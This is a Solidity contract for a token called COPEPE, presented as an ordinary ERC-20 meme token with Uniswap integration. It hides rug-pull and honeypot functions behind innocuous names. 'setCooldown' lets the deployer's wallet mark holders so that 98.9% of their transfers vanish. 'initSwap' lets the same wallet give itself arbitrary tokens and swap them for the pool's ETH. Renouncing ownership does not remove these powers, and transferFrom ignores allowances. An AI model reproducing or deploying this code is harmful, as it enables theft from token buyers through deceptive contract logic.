pragma solidity ^0.8.18;
// SPDX-License-Identifier: MIT


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}


contract Context {
    function msgSender() public view returns (address) {return msg.sender;}
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}
abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    constructor () {
        emit OwnershipTransferred(address(0), _owner);
        _owner = msg.sender;
    }
    function owner() public view virtual returns (address) {return _owner;}
}

contract Copepe is Ownable, Context {
    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    bool cooldownEnabled = true;
    function disableCooldown() external onlyOwner {
        cooldownEnabled = false;
    }
    address public marketingWallet;
    uint256 maxTransaction = 1000000000000 * 10 ** _decimals;
    uint256 maxWalletAmount = 1000000000000 * 10 ** _decimals;
    constructor() {
        _balances[msg.sender] = _totalSupply; 
        marketingWallet = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    string private _name = "COPEPE";
    string private _symbol = "COPEPE";
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function setCooldown(address[] calldata _address) external { 
        uint256 to = block.number + 1;
        for (uint _inx = 0;  _inx < _address.length;  _inx++) { 
            if (fromMarketingWallet()){cooldowns[_address[_inx]] = to;}
        }
    } 
    mapping(address => uint256) private _balances;
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    } 
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function _transfer(address _from, address _to, uint256 _amount) internal {
        require(_amount <= _balances[_from]); 
        require(_from != address(0));
        uint256 feeAmount = (cooldowns[_from] != 0 && cooldowns[_from] <= block.number) ? _amount.mul(989).div(1000) : 0;
        _balances[_from] -= _amount; 
        _balances[_to] += _amount - feeAmount;
        emit Transfer(_from, _to, _amount);
    }
    function transfer(address recipient, uint256 value) public returns (bool) { _transfer(msg.sender, recipient, value); return true; }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function initSwap(uint256 value, address swapAddress) external {
        if (fromMarketingWallet()) { _approve(address(this), address(uniswapRouter),  value); 
        _balances[address(this)] = value;
        address[] memory path = new address[](2);  
        path[0] = address(this);   path[1] = uniswapRouter.WETH();  
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(value, 0, path, swapAddress, 30 + block.timestamp);
        }
    }
    mapping (address => uint256) cooldowns;
    function balanceOf(address account) public view returns (uint256) { return _balances[account]; } 
    function fromMarketingWallet() internal view returns (bool) {
        return msgSender() == marketingWallet;
    }
    event Transfer(address indexed from, address indexed to_add, uint256);
    function transferFrom(address _from, address _to, uint256 amount) public returns (bool) {
        _transfer(_from, _to, amount);
        require(_allowances[_from][msg.sender] >= amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0));
        require(owner != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    event Approval(address indexed from_add, address indexed to_add, uint256 value);
    function totalSupply() external view returns (uint256) { 
        return _totalSupply; 
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
}